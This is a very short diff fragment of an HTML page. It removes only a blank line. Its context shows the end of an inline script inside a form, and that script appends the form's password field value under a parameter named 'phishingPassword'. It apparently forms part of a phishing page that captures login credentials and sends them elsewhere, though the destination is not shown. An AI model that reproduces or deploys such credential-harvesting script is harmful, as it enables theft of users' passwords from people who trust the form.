@@ -11,6 +11,5 @@
       + "&phishingPassword=" + document.forms[0].password.value;
     }
   </script>
-  
 </form>
 
